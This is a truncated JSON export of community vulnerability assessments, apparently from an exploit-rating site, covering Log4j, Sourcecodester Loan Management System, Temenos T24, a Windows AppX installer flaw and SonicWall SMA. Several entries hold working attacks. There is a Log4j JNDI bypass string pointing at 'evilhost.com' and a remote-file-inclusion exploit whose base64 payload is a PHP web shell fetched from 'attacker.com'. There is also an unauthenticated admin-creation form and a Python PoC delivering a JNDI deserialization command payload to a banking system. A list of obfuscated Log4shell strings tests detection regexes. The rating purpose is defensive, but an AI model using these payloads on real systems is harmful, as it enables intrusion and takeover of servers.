          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3c44b439-6094-42a4-bc7f-201eec185a32",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "398cad69-31e4-4276-b510-d93b2c648a74",
      "created": "2021-12-18T00:29:09.996119Z",
      "revisionDate": "2021-12-22T22:26:39.749206Z",
      "document": "Whilst this was originally considered a DoS vulnerability, new evidence has turned up as noted at https://www.lunasec.io/docs/blog/log4j-zero-day-severity-of-cve-2021-45046-increased/?s=09#update-the-localhost-bypass-was-discovered and later at https://twitter.com/marcioalm/status/1471740771581652995 by M\u00e1rcio Almeida that is possible to bypass the `allowedLdapHost` and `allowedClasses` checks in Log4J 2.15.0. to achieve RCE by simply modifying following PoC slightly:\r\n\r\n```\r\n${jndi:ldap://127.0.0.1#evilhost.com:1389/a}\r\n```\r\n\r\nThis bypass works due to the call chain calling `java.net.URI getHost()` returning the value before the `#` sign as the real host, which will return `127.0.0.1`. However the actual JDNI/LDAP resolver will end up using the full hostname string, so provided you can get it to respond to the weird hostname, you should be good.\r\n\r\nFurther investigation however shows that this vulnerability is mostly mitigated by a few factors as noted by Kevin Beaumont at https://twitter.com/GossiTheDog/status/1471791074314276867 and in a further Twitter thread by @buherator at https://twitter.com/buherator/status/1471869066470113288.\r\n\r\nSpecifically the following restrictions apply:\r\n1. The vulnerability only applies in a nondefault configuration. Specifically `%m{lookups}` need to be enabled in the message log. On 2.15.0 message lookups come disabled by default, however previous versions may come shipped with this enabled by default.\r\n2. So far reliable RCE has only been demonstrated on MacOS, and most people aren't going to be running critical apps on this device.\r\n3. Whilst it is possible to query the weird name LDAP name on other hosts, it appears, according to the thread at https://twitter.com/buherator/status/1471878423459110913, that the Java resolver enforces restrictions that prevent the name from being resolved. Whilst is is possible to get around this, as noted at https://twitter.com/douglasmun/status/1471884380545044480, it requires the DNS provider on the target system being set to a non-default provider.\r\n\r\nIt should be noted that developments on this are still ongoing so its likely the situation could change, however this is the latest info I have on this as of the evening of December 17th, 2021. Due to the restrictions I'm rating exploitability as very low as a lot of things must be true from the sounds of it for this to be exploitable, however if it is exploitable the impact is very high and is the same as the log4shell exploit. \r\n\r\nIt should be noted despite all this that there exists other issues within Log4j versions prior to 2.16 such as Praetorian's demonstration of sensitive information exfiltration as noted at https://www.praetorian.com/blog/log4j-2-15-0-stills-allows-for-exfiltration-of-sensitive-data/. Therefore whilst this particular vulnerability may not be as impactful there are plenty of other reasons why you should upgrade to 2.16 or later of log4j if you haven't already.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b06e8ac0-a4d5-4ee4-a5ee-f0adb1749f4d",
      "editorId": "73613c0d-a793-47c0-80cf-5b973b59ac4b",
      "topicId": "be3ff4dc-778c-455d-965e-75362a9a5b3b",
      "created": "2021-12-18T16:40:48.602597Z",
      "revisionDate": "2021-12-23T07:41:02.597208Z",
      "document": "-  A Remote Code Execution (RCE) vulnerability exists in Sourcecodester Loan Management System 1.0 via the page parameter to index.php\r\nThe bug is affecting the [index.php] file through [page] parameter due to unsafe usage of remotely [include] function;\r\n\r\n- if we tak a look at the index.php file we can see the following code:\r\n\r\n```\r\n<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?> <?php include $page.'.php' ?>\r\n```\r\n\r\nThe index file have a parameter ```page``` and by default the value is ```home```. Then its including the ```home``` page add ```.php``` to it.\r\n\r\n Attacker login to the panel then create a PHP file that contains malicious PHP code on a remote server then pass the malicious file URL to the target through the [page] parameter and the target execute the code which gives permissions to the attacker to do malicious activities such as ( Delete, create, modify &, etc..) on the target server and the attacker will be able to achieve RCE ( remote code execution ).\r\n \r\n \r\n \r\n Note: To make the server execute your malicious code your code must be like that:\r\n ```\r\n <?php\r\n echo base64_decode(\"PGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+CgpDTUQgPGlucHV0IG5hbWU9ImNtZCIgdHlwZT0idGV4dCI+Cgo8YnI+CjxpbnB1dCBuYW1lPSJzdWIiIHR5cGU9InN1Ym1pdCI+CjwvZm9ybT4KPD9waHAKZWNobyAiPHByZT4iOwpzeXN0ZW0oQCRfUE9TVFsiY21kIl0pOwplY2hvICI8L3ByZT4iOwo/Pg==\");\r\n ?>\r\n ```\r\n\r\n E.x: http://target.com/index.php?page=http://attacker.com/exploit\r\n Note: Don't add [.php] to your attacker URL because the script will add .php at the end of the [page] parameter value automatically.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "fa5dc668-e28c-4528-a430-5798f02f1c98",
      "editorId": "73613c0d-a793-47c0-80cf-5b973b59ac4b",
      "topicId": "111d12eb-94fe-4313-a8f8-4a00a5ee8861",
      "created": "2021-12-18T16:53:56.959468Z",
      "revisionDate": "2021-12-22T22:26:25.488991Z",
      "document": " An Incorrect Access Control vulnerability exists in Sourcecodester Loan\r\n Management System 1.0. The ajax.php endpoint.\r\n\r\n- if we take a look at the source code of the ajax.php file which is responsable for actions ( add, delete , modify users & more ).\r\n- we can see that there is no code to check for a session or the authentication of the user. \r\n\r\nThe attacker can send a POST requests to add users without any permissions or requirements. Also, without authentication just but send the following request or using the following HTML code:\r\n \r\n ```\r\n <html>\r\n   <body>\r\n   <script>history.pushState('', '', '/')</script>\r\n     <form action=\"http://target.com/ajax.php?action=save_user\" method=\"POST\">\r\n       <input type=\"hidden\" name=\"id\" value=\"\" />\r\n       <input type=\"hidden\" name=\"name\" value=\"CVE\" />\r\n       <input type=\"hidden\" name=\"username\" value=\"cve\" />\r\n       <input type=\"hidden\" name=\"password\" value=\"cve@password\" />\r\n       <input type=\"hidden\" name=\"type\" value=\"1\" />\r\n       <input type=\"submit\" value=\"Submit request\" />\r\n     </form>\r\n   </body>\r\n </html>\r\n```",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "3eaf9868-cdf0-469d-8de3-cd0e703f20f8",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "0b6c144f-2e5a-4d5e-b629-e45c2530cb94",
      "created": "2021-12-19T09:49:40.772562Z",
      "revisionDate": "2021-12-22T22:26:11.066463Z",
      "document": "![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-44228/docs/Apache-Log4j-Logo-960x540.png)\r\n\r\n## [Software](https://logging.apache.org/log4j/2.x/download.html)\r\n\r\n- Explanation: [log4j](https://logging.apache.org/log4j/2.x/security.html)\r\n\r\n- Collaboration: [burp-log4shell](https://github.com/silentsignal/burp-log4shell)\r\n\r\n- - Thanks\r\n\r\n## [More](https://businessinsights.bitdefender.com/technical-advisory-zero-day-critical-vulnerability-in-log4j2-exploited-in-the-wild)\r\n\r\n## [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)\r\n\r\n# Protect yourself, before you break yourself... ;)\r\n\r\n## Description:\r\n\r\nApache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.\r\n\r\n## Usage and explanation:\r\n\r\n- Demonstration of scanning for `Log4j` vulnerability\r\n\r\n- - NOTE: For advanced users!\r\n\r\n- Manual installing the extension for BurpSuite\r\n\r\n[![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-44228/docs/Screenshot%202021-12-17%20140538.png)](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f)\r\n\r\n## IMPORTANT:\r\n\r\n- Check in to BApp Store if all components are deployed!\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-44228/docs/Screenshot%202021-12-17%20141456-important.png)\r\n\r\n-----------------------------------------------------------\r\n\r\n```python\r\n>>> from log4shell_regexes import *\r\n\r\n>>> t = lambda s: [k for k in test(s)]\r\n>>> tt = lambda s: [(k, list(v.keys())) for k, v in test_thorough(s).items()]\r\n\r\n>>> t('${ jndi\\t: addr\\n}')\r\n['SIMPLE_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${ jndi\\t: addr\\n')\r\n['SIMPLE_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('\\044%7B\\\\44{env:NOTHING:-j}\\u0024{lower:N}\\\\u0024{lower:${upper:d}}}i:addr}')\r\n['SIMPLE_ESC_VALUE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_ESC_VALUE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${base64:d2hvIHRob3VnaHQgYW55IG9mIHRoaXMgd2FzIGEgZ29vZCBpZGVhPwo=}')\r\n['ANY_RE', 'ANY_INCL_ESCS_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('%24%7Bjnd%24%7Bupper%3A%C4%B1%7D%3Aaddr%7D')\r\n['NESTED_INCL_ESCS_RE', 'ANY_INCL_ESCS_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('$%7B\\u006a\\\\156di:addr\\\\x7d')\r\n['ANY_INCL_ESCS_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${jndi:${lower:l}${lower:d}a${lower:p}://$a{upper:d}dr}')\r\n['SIMPLE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${jndi:dns://addr}')\r\n['SIMPLE_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${${base64:am5kaTpsZGFwOi8vYWRkcgo=}}') # LOG4J2-2446\r\n['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${jndi:${lower:l}${lower:d}a${lower:p}://addr')\r\n['SIMPLE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${${::-j}nd${upper:\u0131}:rm${upper:\u0131}://addr}')\r\n['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//addr}')\r\n['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\r\n>>> t('%5Cu002524%257Bjnd%2524%257Bupper%255Cu003a%255C%255C461%257D%253Aldap%253A%5C0452F%252Faddr%257D')\r\n[]\r\n\r\n>>> tt('%5Cu002524%257Bjnd%2524%257Bupper%255Cu003a%255C%255C461%257D%253Aldap%253A%5C0452F%252Faddr%257D')\r\n[\r\n\t(\r\n\t\t'\\\\u002524%7Bjnd%24%7Bupper%5Cu003a%5C%5C461%7D%3Aldap%3A\\\\0452F%2Faddr%7D',\r\n\t\t['NESTED_INCL_ESCS_RE', 'ANY_INCL_ESCS_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\t), (\r\n\t\t'${jnd${upper\\\\u003a\\\\\\\\461}:ldap://addr}',\r\n\t\t['SIMPLE_ESC_VALUE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_ESC_VALUE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\t), (\r\n\t\t'${jnd${upper:\\\\461}:ldap://addr}',\r\n\t\t['SIMPLE_ESC_VALUE_RE', 'NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'SIMPLE_ESC_VALUE_OPT_RCURLY_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\t), (\r\n\t\t'${jnd${upper:\u0131}:ldap://addr}',\r\n\t\t['NESTED_RE', 'NESTED_INCL_ESCS_RE', 'ANY_RE', 'ANY_INCL_ESCS_RE', 'NESTED_OPT_RCURLY_RE', 'NESTED_INCL_ESCS_OPT_RCURLY_RE', 'ANY_OPT_RCURLY_RE', 'ANY_INCL_ESCS_OPT_RCURLY_RE']\r\n\t)\r\n]\r\n```\r\n\r\n## Docker vulnerable app:\r\n\r\n```docker\r\ncd vuln_app/CVE-2021-44228-VULN-APP/\r\ndocker build -t log4j-shell-poc .\r\ndocker run --network host log4j-shell-poc\r\n```\r\n\r\n- Listening on port `8080`\r\n\r\n\r\n## Support for vulnerable machine APP by \r\n \r\n\r\n - `kozmer`\r\n\r\n## Support for Burp module by\r\n\r\n- `silentsignal`\r\n\r\n## Demo, testing, and debugging by\r\n\r\n- `nu11secur1ty`\r\n\r\n## Video and reproduce of the vulnerability \r\n\r\n- NOTE: The test is outside of the credentials for login! ;)\r\n\r\n[href](https://streamable.com/z1qkax)\r\n\r\n-------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n## [More](https://github.com/YfryTchsGD/Log4jAttackSurface)\r\n\r\n\r\n## [Information](https://logging.apache.org/log4j/2.x/)\r\n\r\n## [Scanner](https://github.com/fullhunt/log4j-scan)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "041c304c-91fa-4179-b5ff-62b10113af25",
      "editorId": "2a7acc94-7164-4cbf-a379-f419bd39ce18",
      "topicId": "0b6c144f-2e5a-4d5e-b629-e45c2530cb94",
      "created": "2021-12-21T01:23:45.560649Z",
      "revisionDate": "2022-08-31T14:20:21.614847Z",
      "document": "The vulnerabilities exists in Temenos T24, widely used in core-banking,\r\nThere're many entrypoints to trigger this vulnerability, as an example, i used the FileUploadServlet, because it's accessible without any authentication:\r\n```\r\npackage com.temenos.t24browser.servlets;\r\n\r\npublic class FileUploadServlet extends HttpServlet {\r\npublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n       FileUploadServlet.InnerServletClass innerObj = new FileUploadServlet.InnerServletClass(request);\r\n        //truncated\r\n        if (paramName.equalsIgnoreCase(\"uploadType\")) {\r\n             innerObj.setUploadType(paramValue);\r\n             innerObj.setUploadTypeInfoFromT24(); <=\r\n//truncated\r\n```\r\nThe uploadType is passed from user input, then passed to the innerObj\r\nContent of innerObj.setUploadTypeInfoFromT24():\r\n```\r\nprivate void setUploadTypeInfoFromT24() {\r\n            try {\r\n                String responseXml = FileUploadServlet.this.sendUtilityRequest(\"OS.GET.UPLOAD.TYPE.INFO\", this.uploadType, this.request);\r\n                String uploadTypeInfo = Utils.getNodeFromString(responseXml, \"uploadTypeInfo\");\r\n                if (FileUploadServlet.LOGGER.isDebugEnabled()) {\r\n                    FileUploadServlet.LOGGER.debug(\"File upload: uploadTypeInfo=\" + uploadTypeInfo);\r\n                }\r\n\r\n                if (!uploadTypeInfo.contains(\"<maxFileSize>\")) {\r\n                    throw new IllegalArgumentException(\"EB-FILE.UPLOAD.TYPE.NOT.FOUND|\" + this.uploadType + \"|\"); <=\r\n                }\r\n}\r\n```\r\nAs you can see, if the uploadType is invalidated, an exception will be thrown and passed to the LOGGER.error(),\r\nPoC script:\r\n```\r\nimport requests\r\nimport base64\r\nimport sys\r\n\r\n\r\ntarget = sys.argv[1]\r\ncmd = base64.b64encode(sys.argv[2])\r\nprint(\"Attacking \" + target)\r\nprint(\"Cmd: \"+ sys.argv[2])\r\nldap_url = \"ldap://<server>:2389/Deserialization/ROME/command/base64/\"+cmd\r\n\r\n\r\nburp0_url = target + \"/BrowserWeb/servlet/BrowserServlet\"\r\nburp0_headers = {\"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Referer\": target + \"/BrowserWeb/\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"en-US,en;q=0.9\", \"Connection\": \"close\"}\r\nct = requests.get(burp0_url, headers=burp0_headers, verify=False)\r\ntoken = ct.cookies.get('JSESSIONID')\r\n\r\nburp0_url = target + \"/BrowserWeb/servlet/FileUploadServlet\"\r\nburp0_cookies = {\"JSESSIONID\": token}\r\nburp0_headers = {\"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundarygrfK28lThpyA12GG\", \"User-Agent\": \"Mozilla/5.0\", \"Connection\": \"close\"}\r\nburp0_data = \"------WebKitFormBoundarygrfK28lThpyA12GG\\r\\nContent-Disposition: form-data; name=\\\"uploadType\\\"\\r\\n\\r\\n${jndi:\"+ldap_url+\"}\\r\\n\\r\\n------WebKitFormBoundarygrfK28lThpyA12GG--\\r\\n\"\r\nrequests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False)\r\n\r\n```",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Execution"
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "daf6ae08-65a0-40e9-9906-bbace06473bb",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "611afaad-2588-4edf-bf02-0414f5027e97",
      "created": "2021-12-21T15:56:09.801515Z",
      "revisionDate": "2022-01-05T17:05:19.185026Z",
      "document": "A great overview of this bug is available at https://borncity.com/win/2021/12/16/update-fixt-windows-appx-installer-0-day-schwachstelle-cve-2021-43890-emotet-schlupfloch/ which leads on from a description at https://borncity.com/win/2021/12/02/windows-10-11-falle-beim-trusted-apps-installer/ showing how this bug was exploited in the wild. Essentially, by abusing the `ms-appinstaller://` URI handler in Microsoft Windows, one can trick users into thinking that the website is trying to ask them to install software to do something; in the case of the campaign it was to install a PDF viewer so that one could open a protected PDF.\r\n\r\nHowever what is interesting here is that if a user goes to inspect the properties of the app to be installed, a cursory glance will show that, according to AppX Installer, it is signed by a trusted publisher and the publisher details look legitimate. Its not unless you click on the `Trusted App details` link that one will see that something looks odd (assuming of course the user hasn't already found the request for downloading a PDF viewer for viewing a sent PDF file suspicious).\r\n\r\nMicrosoft fixed this bug by disabling the `ms-appinstaller://` URL entirely to prevent it from being abused for these types of attacks, however it is also recommended that the `Prevent non-admin users from installing packaged Windows apps` setting be set to prevent non-admin users from being able to install packaged Windows apps, which should prevent variants of this attack from being exploitable in your environment. More information on these and other mitigations can be found under the `Workarounds` section at https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43890. ",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "9dbc2d1a-0cde-4c8d-8ac3-c09ab6dadd25",
      "editorId": "e616c7fd-27b1-463a-ac0e-a9e249e223c6",
      "topicId": "d68ac653-0330-4eab-86e3-2a6801eba4f0",
      "created": "2022-01-03T15:07:43.143513Z",
      "revisionDate": "2022-01-03T15:07:43.142583Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "fb5385a6-e449-45e3-9308-be6b7c12d8f0",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "1ae51720-4534-42a8-879c-01ffe347e837",
      "created": "2022-01-11T14:19:23.580479Z",
      "revisionDate": "2022-12-13T01:29:25.872439Z",
      "document": "This unauthenticated and remote stack-based buffer overflow allows an attacker to execute code on the remote SMA 100 series target. Exploitation can be a challenge though. For additional details, see the Rapid7 analysis.",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "4b3e2780-bb07-4eed-8f6e-572835459aec",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "daab0b0b-1a56-4673-bbb3-f1b70895a2e4",
      "created": "2022-01-11T14:22:50.251252Z",
      "revisionDate": "2022-01-11T16:21:30.824131Z",
      "document": "This authenticated and remote command injection allows a remote attacker to execute code as `root`. Authentication is the only serious hurdle to exploiting this issue, and it should be noted that SMA 100 series use default credentials for the `admin` user. For full details see the Rapid7 analysis.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
